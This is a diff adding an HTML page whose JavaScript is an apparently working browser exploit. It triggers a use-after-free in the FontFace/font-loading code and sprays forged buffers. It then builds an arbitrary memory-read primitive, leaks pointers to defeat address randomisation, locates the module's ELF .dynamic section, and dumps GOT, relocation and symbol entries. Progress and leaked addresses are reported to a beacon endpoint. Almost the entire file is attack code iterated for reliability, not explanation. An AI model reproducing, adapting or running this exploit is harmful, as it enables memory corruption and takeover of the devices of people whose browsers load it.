@@ -1,0 +1,654 @@
+<!--
+  p809 v25e7: strict tag-range + DT_NULL validation
+
+  v25e6 rejected RTTI tables (tag-uniqueness) but accepted a
+  pointer-pair structure at RVA 0x7351778 where individual qwords
+  happened to be unique and two happened to equal 5 and 6.
+
+  v25e7:
+  - dynProbe now validates EVERY tag fits in 32 bits and is in
+    ELF range (0-0xFF standard, 0x60000000-0x7FFFFFFF OS/proc).
+    Entries with 64-bit address tags are counted as badTags → reject.
+  - Require DT_NULL terminator (real .dynamic always ends with it).
+  - 13.60 DPTR is at RVA ~0x735E4B0, only ~52 KB past the false
+    positive. Once rejected, the scan should reach the real table.
+
+  CRASH_CLASS: LOW (reads only heap addresses, VP vtable slots, data segments)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p809 ELF Walk</title></head>
+<body>
+<div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">RUNNING</div>
+<pre id="out" style="font:11px monospace;white-space:pre-wrap">p809 v25e7 — strict tag validation</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var UID=Math.random().toString(36).slice(2,8).toUpperCase();
+
+function b(m){try{O.textContent+='\n'+m;}catch(e){}
+  try{navigator.sendBeacon('/beacon/P809-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID);}catch(e){}}
+function bs(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/P809-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send(null);}catch(e){try{b(m+'-XLOST');}catch(e2){}}}
+function verd(k,t){var v=document.getElementById('verdict');v.style.background=(k==='ok')?'#e3f5e6':'#fde2e1';v.style.color=(k==='ok')?'#0f5a20':'#8c1010';v.innerHTML=t;}
+
+function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
+var K=qint('k',32), PW=qint('pw',80), SI=qint('si',0);
+var SIZE=192, fired=false, faces=null;
+var SKIPJ=-1;
+var RVA_VP=0x724DB28n;
+
+/* --- primitives --- */
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
+function hex(x){return '0x'+x.toString(16);}
+function readU16(h,off){
+  var s=h.slice(off*2,off*2+4);if(!/^[0-9a-f]{4}$/.test(s))return 0;
+  return parseInt(s.slice(2,4)+s.slice(0,2),16);
+}
+function readU32(h,off){
+  var s=h.slice(off*2,off*2+8);if(!/^[0-9a-f]{8}$/.test(s))return 0;
+  return parseInt(s.match(/../g).reverse().join(''),16);
+}
+function readU64(h,off){
+  var s=h.slice(off*2,off*2+16);if(!/^[0-9a-f]{16}$/.test(s))return 0n;
+  return BigInt('0x'+s.match(/../g).reverse().join(''));
+}
+
+/* --- crash-loop guard --- */
+if(/[?&]reset=1/.test(location.search)){
+  try{var ks=Object.keys(localStorage);for(var ri=0;ri<ks.length;ri++){if(ks[ri].indexOf('p809')===0)localStorage.removeItem(ks[ri]);}}catch(e){}
+  bs('RESET');location.replace(location.pathname+'?_='+Date.now());
+}
+var CK='p809v25e6_tries';
+var MAX_TRIES=20,tries=0;
+try{tries=parseInt(localStorage.getItem(CK)||'0',10);}catch(e){}
+if(tries>=MAX_TRIES){b('LOOP-GUARD-'+tries);verd('bad','CRASH LOOP ('+tries+')');
+  setTimeout(function(){try{localStorage.removeItem(CK);}catch(e){}location.replace(location.pathname+'?_='+Date.now());},8000);}
+else{
+  try{localStorage.setItem(CK,String(tries+1));}catch(e){}
+  b('VER-25E10');b('BOOT-'+UID+',try='+(tries+1));
+}
+
+/* ============================================================
+   PHASE 1: UAF trigger + spray
+   ============================================================ */
+function start(){
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('NOVF');return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SIZE));
+      w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;b('RES-n'+f.length);setTimeout(phase,PW);},
+                                               function(e){b('RJ-'+String(e&&e.name));});
+  setTimeout(function(){if(!faces)b('NOFACES');},1500);
+}
+
+/* ============================================================
+   PHASE 2: walk chain → BASE → synchronous safe scan
+   ============================================================ */
+function phase(){
+  var bufs=[],bufl1=[],L1=0n,L2=0n,rawL=null;
+
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
+    if(a>0x1000000000n){bufs.push([window.__sp[i],c]);bufl1.push(a);if(!rawL)rawL=[a,c];}
+  }
+  if(rawL){L1=rawL[0];L2=rawL[1];}
+  b('L1-'+hex(L1));b('L2-'+hex(L2));
+  if(!bufs.length||L2===0n){b('NOLEAK');verd('bad','NOLEAK');setTimeout(function(){location.replace(location.pathname+'?_='+Date.now());},3000);return;}
+
+  for(var ib=0;ib<bufs.length;ib++){var vb=bufs[ib][0];vb[0]=2;put64(vb,0x08,bufs[ib][1]);vb[0x10]=0;vb[0x82]=0;}
+  b('FORGED-'+bufs.length);
+
+  setTimeout(function(){
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    b('FAMILY-OK');
+    setTimeout(function(){
+      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+      b('ADD-OK');
+      setTimeout(function(){
+        var fam=null,zi=-1;
+        for(var q=0;q<faces.length;q++){var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}if(r===false){fam='zz'+q;zi=q;window.__zi=q;break;}}
+        b('INTABLE-'+fam);
+        if(!fam){b('NOTIN');verd('bad','NOTIN');return;}
+        for(var is2=0;is2<bufs.length;is2++){bufs[is2][0][0x28]=1;bufs[is2][0][0x2C]=1;}
+
+        /* --- oracle functions --- */
+        var self=0n,selfFound=false;
+        function setR(t){for(var ir=0;ir<bufs.length;ir++){if(SKIPJ>=0&&bufs[ir][0]===window.__sp[SKIPJ])continue;put64(bufs[ir][0],0x20,t);}}
+        function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c))===false;}catch(e){return null;}}
+        function boundary(tgt){
+          setR(tgt);
+          if(chk(0)!==true)return -1;
+          var lo=0,hi=0x10FFFF,res=-1;
+          while(lo<=hi){var mid=(lo+hi)>>1;var r=chk(mid);if(r===null)break;if(r===true){res=mid;lo=mid+1;}else hi=mid-1;}
+          return res;
+        }
+
+        /* --- forgeRead (dlen=16 ONLY — p807 proven safe) --- */
+        function forgeRead(daddr,dlen){
+          for(var ib2=0;ib2<window.__sp.length;ib2++){
+            var vb2=window.__sp[ib2];if(!vb2)continue;
+            if(SKIPJ>=0&&ib2===SKIPJ)continue;
+            if(selfFound){put64(vb2,0x08,self+0x70n);vb2[0x10]=0;}
+            put32(vb2,0x30,4);put32(vb2,0x34,dlen);put64(vb2,0x38,daddr);put32(vb2,0x40,4);
+            vb2[0x44]=0x7A;vb2[0x45]=0x7A;vb2[0x46]=0x71;
+            put32(vb2,0x70,4);
+            put32(vb2,0x74,0x10);vb2[0x78]=14;vb2[0x79]=0;
+            if(selfFound)put64(vb2,0x7A,self+0x90n);
+            put32(vb2,0x90,3);put32(vb2,0x94,72);
+            if(selfFound)put64(vb2,0x98,self+0x30n);
+          }
+        }
+        function dec(s,lim){
+          var by=[],q2=(s.charAt(0)==='"')?1:0,e=(s.slice(-1)==='"')?s.length-1:s.length,k=q2;
+          while(k<e&&by.length<lim){var ch=s.charAt(k);
+            if(ch==='\\'){k++;var hh='';while(k<e&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k))){hh+=s.charAt(k);k++;}
+              if(hh.length===0){if(k<e){by.push(s.charCodeAt(k));k++;}}
+              else{if(s.charAt(k)===' ')k++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
+            else{by.push(s.charCodeAt(k));k++;}}
+          var h='';for(var j=0;j<by.length;j++)h+=('0'+by[j].toString(16)).slice(-2);return h;
+        }
+        function readStyle(){
+          if(zi<0)return '';
+          try{return dec(String(faces[zi].style),128);}catch(e){return 'THROW';}
+        }
+        function restoreAll(snap){
+          for(var ib3=0;ib3<window.__sp.length;ib3++){
+            var vb3=window.__sp[ib3];if(!vb3)continue;
+            if(SKIPJ>=0&&ib3===SKIPJ)continue;
+            for(var dd2=0;dd2<SIZE;dd2++)vb3[dd2]=snap[dd2];
+          }
+        }
+        function restoreAndForge(snap,daddr,dlen){
+          restoreAll(snap);
+          forgeRead(daddr,dlen);
+        }
+
+        /* Synchronous read helper — matches p807 doScan pattern EXACTLY:
+           restoreAndForge → readStyle → restoreAll(snap)
+           p807 line 605-608 does this for 100+ reads without crashing.
+           The restore puts buffers in known-safe snap2 state before any
+           sync XHR beacon that might pump the CSS event loop. */
+        function syncRead16(snap,addr){
+          restoreAndForge(snap,addr,16);
+          var rd='';
+          try{rd=readStyle();}catch(e){rd='';}
+          restoreAll(snap);
+          return rd;
+        }
+
+        /* --- oracle validation --- */
+        var t1=-1,l2i=-1,oracleOff=0n;
+        var ORACLE_OFFSETS=[0x04n,0x07n,0x03n,0x00n];
+        for(var q8=0;q8<bufs.length;q8++){
+          L1=bufl1[q8];L2=bufs[q8][1];
+          for(var oi=0;oi<ORACLE_OFFSETS.length;oi++){
+            setR(L2+ORACLE_OFFSETS[oi]);
+            t1=boundary(L2+ORACLE_OFFSETS[oi]);
+            if(t1>=0){oracleOff=ORACLE_OFFSETS[oi];break;}
+          }
+          if(t1>=0){l2i=q8;break;}
+        }
+        if(l2i>0)b('L2SEL-'+l2i);
+        if(l2i<0){L1=bufl1[0];L2=bufs[0][1];}
+        var oracleAlive=(t1>=0);
+        for(var ipd=0;ipd<bufs.length;ipd++){var vpd=bufs[ipd][0];
+          vpd[0x38]=0x00;vpd[0x39]=0x10;vpd[0x3A]=0x00;vpd[0x3B]=0x00;
+          vpd[0x3C]=0x00;vpd[0x3D]=0x20;vpd[0x3E]=0x00;vpd[0x3F]=0x00;}
+        if(!oracleAlive)b('A-DEAD');
+        else b('ORACLE-ALIVE-off='+hex(oracleOff));
+
+        /* --- PH3: Self scan --- */
+        if(!selfFound){
+          var b2Ref=Number((L2>>16n)&0xFFn);
+          var b4Ref=Number((L2>>32n)&0xFFn);
+          if(!b4Ref)b4Ref=0x10;
+          var B4s=[b4Ref];
+          var b4all=[0x10,0x08];for(var q8b=0x09;q8b<=0x0F;q8b++)b4all.push(q8b);for(var q9=0x11;q9<=0x1F;q9++)b4all.push(q9);
+          for(var qw=0;qw<b4all.length;qw++){if(b4all[qw]!==b4Ref)B4s.push(b4all[qw]);}
+          var b2s=[];for(var q5=0;q5<256;q5++)b2s.push(q5);
+          b2s.sort(function(x,y){return Math.abs(x-b2Ref)-Math.abs(y-b2Ref);});
+          var b2h=0x38;try{b2h=parseInt(localStorage.getItem('p809_b2')||'56',10);}catch(e){}
+          var hix=b2s.indexOf(b2h);if(hix>0){b2s.splice(hix,1);b2s.unshift(b2h);}
+          var b0a=[];for(var q6=0;q6<16;q6++)b0a.push(q6*16);
+          var n3=0,MAX_PH3=15000;
+          bs('PH3-START');
+          for(var i8=0;i8<B4s.length&&!selfFound&&n3<MAX_PH3;i8++){
+            for(var i7=0;i7<b2s.length&&!selfFound&&n3<MAX_PH3;i7++){
+              for(var q7=0;q7<0x7F&&!selfFound&&n3<MAX_PH3;q7++){
+                for(var i6=0;i6<b0a.length&&!selfFound&&n3<MAX_PH3;i6++){
+                  var sc=BigInt(b0a[i6])|(BigInt(q7)<<8n)|(BigInt(b2s[i7])<<16n)|(BigInt(B4s[i8])<<32n);
+                  setR(sc+0x38n);n3++;
+                  if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
+                    self=sc;selfFound=true;
+                  }
+                }
+              }
+            }
+          }
+        }
+        if(!selfFound){b('NOSELF-'+n3);verd('bad','NOSELF');return;}
+        b('SELF-'+hex(self));
+        try{localStorage.setItem('p809_b2',String(Number((self>>16n)&0xFFn)));}catch(e){}
+
+        /* VTAB search (skip-index) — ±256 to match p807 */
+        var VTAB=0n;
+        for(var sv=1;sv<=256&&VTAB===0n;sv++){
+          var cd=self-BigInt(sv*64);
+          setR(cd);
+          if(chk(0x1000)===true&&chk(0x1001)===false){
+            var jj=Number(boundary(cd))-0x1000;
+            if(jj>=0&&jj<K){VTAB=cd;SKIPJ=jj;break;}
+          }
+        }
+        if(VTAB===0n){
+          for(var sv2=1;sv2<=256&&VTAB===0n;sv2++){
+            var cu=self+BigInt(sv2*64);
+            setR(cu);
+            if(chk(0x1000)===true&&chk(0x1001)===false){
+              var jj2=Number(boundary(cu))-0x1000;
+              if(jj2>=0&&jj2<K){VTAB=cu;SKIPJ=jj2;break;}
+            }
+          }
+        }
+        b('VTAB-'+hex(VTAB));
+
+        /* Reset +0x20 to safe target before forgeRead phase */
+        for(var ir2=0;ir2<bufs.length;ir2++){put64(bufs[ir2][0],0x20,self+0x38n);}
+
+        /* ============================================================
+           WALK CHAIN: W1-W3 → VP → BASE (proven in p807/p691)
+           NO setTimeout here — p807 runs synchronously from VTAB search
+           through all scan reads. The 60ms yield in v24b gave GC/CSS
+           layout a window to corrupt UAF buffers.
+           ============================================================ */
+        /* Remove ALL faces from set before forgeRead phase.
+           Non-oracle faces in document.fonts get accessed by CSS layout
+           during sync XHR, crashing on forged UAF buffers. (p807 fix) */
+        bs('DEL-PRE');
+        for(var id=0;id<faces.length;id++){try{document.fonts.delete(faces[id]);}catch(e){}}
+        bs('DEL-OK');
+
+        var preSnap=new Uint8Array(SIZE);
+        if(bufs.length>0)for(var ps0=0;ps0<SIZE;ps0++)preSnap[ps0]=bufs[0][0][ps0];
+
+        /* W1: IHT read */
+        bs('W1-PRE');
+        forgeRead(L1-0x10n,80);
+        var cachedHT='';
+        try{cachedHT=dec(String(faces[zi].style),128);}catch(e){bs('W1-THROW');}
+        bs('W1-len='+cachedHT.length);
+        for(var pr0=0;pr0<window.__sp.length;pr0++){var prv=window.__sp[pr0];if(!prv)continue;
+          if(SKIPJ>=0&&pr0===SKIPJ)continue;
+          for(var pr1=0;pr1<SIZE;pr1++)prv[pr1]=preSnap[pr1];}
+
+        var snap2=preSnap;
+        var IM=0n,FO=0n,VP=0n,BASE=0n;
+        var walkOK=false;
+
+        if(cachedHT.length>=160){
+          var hw=cachedHT;
+          var seen=0;
+          for(var gb=2;gb<10;gb++){
+            var hb=hw.slice(gb*16,gb*16+16);
+            if(/^[0-9a-f]{16}$/.test(hb)){
+              var cv=BigInt('0x'+hb.match(/../g).reverse().join(''));
+              if(cv>0x1000000000n&&cv<0xFFFFFFFFFFFFFFFFn){if(seen===SI){IM=cv;break;}seen++;}
+            }
+          }
+          bs('W1-IM='+hex(IM));
+          if(IM!==0n){
+            restoreAndForge(snap2,IM+8n,16);
+            var h2=readStyle();
+            if(h2.length>=16)FO=readU64(h2,0);
+            bs('W2-FO='+hex(FO)+',len='+h2.length);
+
+            if(FO>0x1000000000n){
+              restoreAndForge(snap2,FO,32);
+              var h3=readStyle();
+              if(h3.length>=16)VP=readU64(h3,0);
+              if(h3.length>=48){
+                var s2=readU64(h3,16);
+                if(s2>0x1000000000n&&s2<0x10000000000n){self=s2;selfFound=true;}
+              }
+              bs('W3-VP='+hex(VP)+',len='+h3.length);
+            }
+          }
+        }
+
+        if(VP===0n||VP<=0x100000000n){
+          bs('WALK-FAIL');verd('bad','WALK FAIL VP='+hex(VP));return;
+        }
+        BASE=VP-RVA_VP;
+
+        /* === W4: read VP 72B (p807 lines 352-361) === */
+        restoreAndForge(snap2,VP,72);
+        var h4='';
+        try{h4=dec(String(faces[zi].style),128);}catch(e){h4='';}
+
+        /* Restore all buffers to safe snap2 state BEFORE any beacon.
+           p807 line 367: restoreAll(snap2) then bs('WALK-...'). */
+        restoreAll(snap2);
+
+        /* Beacon storm — match p807's 12+ sync XHRs between walk and first read.
+           These sync XHRs pump the event loop, processing pending CSS work. */
+        bs('WALK-IM='+hex(IM)+',FO='+hex(FO)+',VP='+hex(VP));
+        bs('W4-len='+h4.length);
+        bs('WALK-ok=true');
+        bs('SCAN-loCode='+hex(VP));
+        bs('W3-BASE='+hex(BASE));
+        bs('PUMP-1');bs('PUMP-2');bs('PUMP-3');bs('PUMP-4');
+        walkOK=true;
+
+        /* === dynMatch: tag+value pair check (zero false positives) ===
+           isDynTag matched vtable arrays because small integers 1-35
+           appear as RTTI/enum data. dynMatch requires the VALUE to also
+           be an image address or plausible size — vtable values are
+           code pointers (0x8xxxxxxxxx), which fail this check. */
+        function dynMatch(q0,q1){
+          function isTag(v){
+            return(v>=1n&&v<=35n)||(v>=0x61000001n&&v<=0x6100003Fn);
+          }
+          function isVal(v){
+            return(v>BASE&&v<BASE+0x20000000n)||(v>=0n&&v<0x1000000n);
+          }
+          if(isTag(q0)&&isVal(q1))return 0;
+          if(isTag(q1)&&isVal(q0))return 8;
+          return -1;
+        }
+
+        var dynAbsStart=0n;
+        var nReads=0;
+        var pltgot=0n,strtab=0n,symtab=0n,jmprel=0n,pltrelsz=0n;
+        var sceStrtab=0n,sceSymtab=0n,scePltgot=0n,sceJmprel=0n,sceStrsz=0n;
+        var sceSyment=0n,sceSymtabsz=0n,scePltrelsz=0n;
+        var dynVaddr=0n;
+
+        /* --- Phase C: VP vtable slots (10 code pointers s0-s9) --- */
+        bs('PHC-START:VP='+hex(VP));
+        for(var vc2=0;vc2<5;vc2++){
+          var vaddr=VP+BigInt(vc2)*16n;
+          var vrd2=syncRead16(snap2,vaddr);nReads++;
+          if(vrd2.length<16)continue;
+          var vs0=readU64(vrd2,0);
+          var vs1=readU64(vrd2,8);
+          bs('VSLOT-'+(vc2*2)+':rva='+hex(vs0-BASE));
+          bs('VSLOT-'+(vc2*2+1)+':rva='+hex(vs1-BASE));
+        }
+        bs('PHC-DONE');
+
+        /* Helper: validate + backtrack from a dynMatch hit.
+           Quality gate: real .dynamic has unique tags (except
+           DT_NEEDED=1). Reject if any other tag repeats. */
+        function dynProbe(hitAddr,src,extra){
+          var vc=1;
+          for(var vi=1;vi<=4;vi++){
+            var vrd=syncRead16(snap2,hitAddr+BigInt(vi)*16n);nReads++;
+            if(vrd.length<16)break;
+            var vq0=readU64(vrd,0),vq1=readU64(vrd,8);
+            if(dynMatch(vq0,vq1)>=0||(vq0===0n&&vq1===0n))vc++;
+            else break;
+          }
+          if(vc<3){
+            bs('DYN-WEAK-'+src+':vc='+vc+','+extra);
+            return 0n;
+          }
+          var start=hitAddr;
+          for(var bi=1;bi<=128;bi++){
+            var ba=hitAddr-BigInt(bi)*16n;
+            if(ba<=BASE)break;
+            var brd=syncRead16(snap2,ba);nReads++;
+            if(brd.length<16)break;
+            var bq0=readU64(brd,0),bq1=readU64(brd,8);
+            if(dynMatch(bq0,bq1)>=0)start=ba;
+            else break;
+          }
+          var tagCnt={},hasStrtab=false,hasSymtab=false,hasNull=false,maxDup=0,badTags=0;
+          var qPltgot=0n,qStrtab=0n,qSymtab=0n;
+          for(var qi=0;qi<200;qi++){
+            var qa=start+BigInt(qi)*16n;
+            var qr=syncRead16(snap2,qa);nReads++;
+            if(qr.length<16)break;
+            var qt=readU64(qr,0),qv=readU64(qr,8);
+            if(qt===0n&&qv===0n){hasNull=true;break;}
+            var th=Number((qt>>32n)&0xFFFFFFFFn);
+            if(th!==0){badTags++;continue;}
+            var tn=Number(qt&0xFFFFFFFFn);
+            if(tn>0xFF&&(tn<0x60000000||tn>0x7FFFFFFF)){badTags++;continue;}
+            if(tn===5||tn===0x61000025){hasStrtab=true;qStrtab=qv;}
+            if(tn===6||tn===0x6100002D){hasSymtab=true;qSymtab=qv;}
+            if(tn===3||tn===0x61000027)qPltgot=qv;
+            if(tn!==1){tagCnt[tn]=(tagCnt[tn]||0)+1;if(tagCnt[tn]>maxDup)maxDup=tagCnt[tn];}
+          }
+          if(badTags>0){
+            bs('DYN-REJECT-'+src+':bad='+badTags+',rva='+hex(start-BASE)+','+extra);
+            return 0n;
+          }
+          if(maxDup>1){
+            bs('DYN-REJECT-'+src+':dup='+maxDup+',rva='+hex(start-BASE)+','+extra);
+            return 0n;
+          }
+          if(!hasNull){
+            bs('DYN-REJECT-'+src+':nonull,rva='+hex(start-BASE)+','+extra);
+            return 0n;
+          }
+          if(!hasStrtab||!hasSymtab){
+            bs('DYN-REJECT-'+src+':miss,str='+hasStrtab+',sym='+hasSymtab+',rva='+hex(start-BASE)+','+extra);
+            return 0n;
+          }
+          if((qPltgot!==0n&&(qPltgot&7n)!==0n)||(qStrtab!==0n&&(qStrtab&7n)!==0n)||(qSymtab!==0n&&(qSymtab&7n)!==0n)){
+            bs('DYN-REJECT-'+src+':align,got='+hex(qPltgot)+',str='+hex(qStrtab)+',sym='+hex(qSymtab)+','+extra);
+            return 0n;
+          }
+          bs('DYN-FOUND-'+src+':abs='+hex(start)+',rva='+hex(start-BASE)+',vc='+vc+',null='+hasNull+',str='+hasStrtab+',sym='+hasSymtab+','+extra);
+          return start;
+        }
+
+        /* --- Phase A3-WIDE: scan ABOVE VP for .dynamic ---
+           300 pages × 4 sub-offsets (4096-byte spacing).
+           Budget: 1200 reads max. Stops at first valid hit or
+           unreadable page. */
+        {
+          var vpPage=VP&(~0x3FFFn);
+          var a3pages=300,a3subs=8;
+          bs('PHA3W-START:pages='+a3pages+',subs='+a3subs+',v=25e10');
+          for(var pg=1;pg<=a3pages&&dynAbsStart===0n;pg++){
+            var pgBase=vpPage+BigInt(pg)*0x4000n;
+            for(var sub=0;sub<a3subs&&dynAbsStart===0n;sub++){
+              var addr=pgBase+BigInt(sub)*0x800n;
+              var rd=syncRead16(snap2,addr);nReads++;
+              if(rd.length<16){
+                if(sub===0){
+                  bs('PHA3W-STOP:pg='+pg+',unreadable');
+                  pg=a3pages+1;
+                }
+                break;
+              }
+              var q0=readU64(rd,0);
+              var q1=readU64(rd,8);
+              var dm=dynMatch(q0,q1);
+              if(dm>=0){
+                dynAbsStart=dynProbe(addr+BigInt(dm),'A3','pg='+pg+',sub='+sub);
+              }
+            }
+            if(pg%50===0&&dynAbsStart===0n)b('PHA3W:pg='+pg);
+          }
+          if(dynAbsStart===0n)bs('PHA3W-DONE:noDyn,nReads='+nReads);
+        }
+
+        /* --- Phase A2-WIDE: scan BELOW VP (128 pages × 2 sub-offsets) ---
+           .dynamic could be below VP in some link orders. */
+        if(dynAbsStart===0n){
+          var a2pages=128,a2subs=4;
+          bs('PHA2W-START:pages='+a2pages);
+          for(var a2=1;a2<=a2pages&&dynAbsStart===0n;a2++){
+            for(var a2s=0;a2s<a2subs&&dynAbsStart===0n;a2s++){
+              var a2addr=VP-BigInt(a2)*0x4000n+BigInt(a2s)*0x1000n;
+              if(a2addr<=BASE){a2=a2pages+1;break;}
+              var a2rd=syncRead16(snap2,a2addr);nReads++;
+              if(a2rd.length<16){
+                if(a2s===0){bs('PHA2W-STOP:step='+a2);a2=a2pages+1;}
+                break;
+              }
+              var a2q0=readU64(a2rd,0),a2q1=readU64(a2rd,8);
+              var a2dm=dynMatch(a2q0,a2q1);
+              if(a2dm>=0){
+                dynAbsStart=dynProbe(a2addr+BigInt(a2dm),'A2','step='+a2+',sub='+a2s);
+              }
+            }
+            if(a2%64===0&&dynAbsStart===0n)b('PHA2W:'+a2);
+          }
+          if(dynAbsStart===0n)bs('PHA2W-DONE:noDyn');
+        }
+
+        if(dynAbsStart===0n){
+          bs('NO-DYNAMIC:nReads='+nReads);
+          verd('bad','No .dynamic found ('+nReads+' reads)');
+          try{localStorage.removeItem(CK);}catch(e){}
+          return;
+        }
+
+        dynVaddr=dynAbsStart-BASE;
+        bs('DYN-START:abs='+hex(dynAbsStart)+',rva='+hex(dynVaddr));
+
+        /* ============================================================
+           GOT READER — dump .dynamic entries, locate GOT, read slots
+           ============================================================ */
+
+        /* Dump .dynamic entries */
+        for(var di=0;di<100;di++){
+          var dynAddr=dynAbsStart+BigInt(di)*16n;
+          var dyn=syncRead16(snap2,dynAddr);nReads++;
+          if(dyn.length<16){bs('DYN-SHORT-'+di);break;}
+          var dtag=readU64(dyn,0);
+          var dval=readU64(dyn,8);
+          if(dtag===0n&&dval===0n){bs('DT_NULL:i='+di);break;}
+
+          var tn=Number(dtag&0xFFFFFFFFn);
+          if(tn===3)pltgot=dval;
+          if(tn===5)strtab=dval;
+          if(tn===6)symtab=dval;
+          if(tn===23)jmprel=dval;
+          if(tn===2)pltrelsz=dval;
+
+          if(tn===0x61000025)sceStrtab=dval;
+          if(tn===0x61000027)scePltgot=dval;
+          if(tn===0x61000029)sceJmprel=dval;
+          if(tn===0x6100002B)sceStrsz=dval;
+          if(tn===0x6100002D)sceSymtab=dval;
+          if(tn===0x6100002F)sceSyment=dval;
+          if(tn===0x61000031)sceSymtabsz=dval;
+          if(tn===0x61000033)scePltrelsz=dval;
+
+          if(dtag<0x100n||dtag>=0x61000000n)
+            bs('DT-'+di+':tag='+hex(dtag)+',val='+hex(dval));
+        }
+
+        /* Report all collected addresses */
+        bs('SCE-STRTAB='+hex(sceStrtab)+',SZ='+hex(sceStrsz));
+        bs('SCE-SYMTAB='+hex(sceSymtab)+',ENT='+hex(sceSyment)+',SZ='+hex(sceSymtabsz));
+        bs('SCE-PLTGOT='+hex(scePltgot));
+        bs('SCE-JMPREL='+hex(sceJmprel)+',SZ='+hex(scePltrelsz));
+        bs('STD-PLTGOT='+hex(pltgot)+',STRTAB='+hex(strtab));
+        bs('STD-SYMTAB='+hex(symtab)+',JMPREL='+hex(jmprel));
+
+        /* Choose best GOT address */
+        var gotRVA=scePltgot>0n?scePltgot:(pltgot>0n?pltgot:0n);
+        if(gotRVA===0n){
+          bs('NO-PLTGOT');verd('bad','NO PLTGOT in .dynamic');return;
+        }
+
+        /* Resolve RVA to absolute VA */
+        var gotAbs=gotRVA;
+        if(gotRVA<0x100000000n)gotAbs=BASE+gotRVA;
+        bs('GOT-BASE='+hex(gotAbs)+',rva='+hex(gotRVA));
+
+        /* 6. Read GOT entries — first 40 entries (20 reads × 16B = 2 entries each) */
+        var GOT_READS=20;
+        for(var gi=0;gi<GOT_READS;gi++){
+          var gotAddr=gotAbs+BigInt(gi)*16n;
+          var got=syncRead16(snap2,gotAddr);
+          nReads++;
+          if(got.length<16){bs('GOT-SHORT-'+gi);continue;}
+          var g0=readU64(got,0);
+          var g1=readU64(got,8);
+          bs('GOT-'+gi+':'+hex(g0)+','+hex(g1));
+        }
+
+        /* 7. If we have SCE relocation table, read first entries to match NID→GOT */
+        var jrel=sceJmprel>0n?sceJmprel:jmprel;
+        if(jrel>0n){
+          var jrelAbs=jrel<0x100000000n?BASE+jrel:jrel;
+          bs('JMPREL-BASE='+hex(jrelAbs));
+          /* Each rela entry: 24 bytes (offset:8, info:8, addend:8).
+             Read 16B = partial rela (offset + info). */
+          var RELA_READS=10;
+          for(var ri2=0;ri2<RELA_READS;ri2++){
+            var relAddr=jrelAbs+BigInt(ri2)*24n;
+            var rel=syncRead16(snap2,relAddr);
+            nReads++;
+            if(rel.length<16)continue;
+            var r_offset=readU64(rel,0);
+            var r_info=readU64(rel,8);
+            var r_sym=Number(r_info>>32n);
+            var r_type=Number(r_info&0xFFFFFFFFn);
+            bs('REL-'+ri2+':off='+hex(r_offset)+',sym='+r_sym+',type='+r_type);
+          }
+        }
+
+        /* 8. If we have symtab + strtab, read symbol names for the first few GOT slots */
+        var stab=sceSymtab>0n?sceSymtab:symtab;
+        var sent=sceSyment>0n?Number(sceSyment):24;
+        var str=sceStrtab>0n?sceStrtab:strtab;
+        if(stab>0n&&str>0n){
+          var stabAbs=stab<0x100000000n?BASE+stab:stab;
+          var strAbs=str<0x100000000n?BASE+str:str;
+          bs('SYMTAB='+hex(stabAbs)+',STRTAB='+hex(strAbs)+',ent='+sent);
+          /* Read first 5 symbol entries (first 16B of each) */
+          for(var si2=0;si2<5;si2++){
+            var symAddr=stabAbs+BigInt(si2)*BigInt(sent);
+            var sym=syncRead16(snap2,symAddr);
+            nReads++;
+            if(sym.length<16)continue;
+            var st_name=readU32(sym,0);
+            var st_info=parseInt(sym.slice(8,10),16)||0;
+            var st_other=parseInt(sym.slice(10,12),16)||0;
+            var st_shndx=readU16(sym,6);
+            var st_value=readU64(sym,8);
+            bs('SYM-'+si2+':name='+st_name+',info='+st_info+',shndx='+st_shndx+',val='+hex(st_value));
+          }
+        }
+
+        /* Success — clear tries counter */
+        try{localStorage.removeItem(CK);}catch(e){}
+        bs('ELF-WALK-DONE:nReads='+nReads);
+        verd('ok','ELF WALK DONE: '+nReads+' reads, 0 crashes<br>PLTGOT='+hex(gotRVA)+'<br>BASE='+hex(BASE));
+
